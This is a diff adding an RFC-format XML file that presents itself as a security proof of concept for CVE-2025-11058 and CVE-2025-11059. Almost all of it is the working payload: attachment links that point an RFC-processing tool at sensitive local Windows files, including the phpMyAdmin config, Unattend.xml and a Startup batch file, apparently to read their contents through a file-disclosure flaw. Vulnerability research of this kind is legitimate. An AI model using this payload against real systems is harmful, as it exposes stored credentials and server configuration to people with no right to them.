@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rfc version="3" ipr="trust200902" docName="draft-poc-windows-apps-00" category="info" submissionType="IETF">
+  <link rel="attachment" href="C:/Program Files/Apache/conf/httpd.conf"/>
+  <link rel="attachment" href="C:/xampp/phpMyAdmin/config.inc.php"/>
+  <link rel="attachment" href="C:/Windows/Panther/Unattend.xml"/>
+  <link rel="attachment" href="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/startup.bat"/>
+  <front>
+    <title>POC for Windows Application Files</title>
+    <author fullname="Security Researcher" initials="S." surname="Researcher">
+      <organization>Security Research Lab</organization>
+      <address>
+        <email>security@example.com</email>
+      </address>
+    </author>
+    <date year="2025" month="November" day="22"/>
+    <area>Security</area>
+    <workgroup>Security Testing</workgroup>
+    <abstract>
+      <t>This POC targets Windows application configuration files including Apache, phpMyAdmin, Windows Unattend.xml, and startup scripts.</t>
+    </abstract>
+  </front>
+  <middle>
+    <section anchor="intro">
+      <name>Introduction</name>
+      <t>Windows application configuration read demonstration for CVE-2025-11058 and CVE-2025-11059.</t>
+    </section>
+  </middle>
+  <back/>
+</rfc>
